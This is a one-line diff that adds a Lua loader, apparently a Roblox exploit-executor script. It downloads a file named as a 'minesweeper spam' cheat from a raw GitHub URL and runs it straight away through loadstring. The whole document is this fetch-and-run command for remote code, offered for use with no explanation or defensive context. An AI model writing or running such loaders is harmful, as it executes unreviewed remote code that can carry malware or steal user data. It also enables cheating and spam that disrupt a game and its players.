@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/blockerman-s-minesweeper-spam3-jrtwuqzdof9hr3.lua"))()
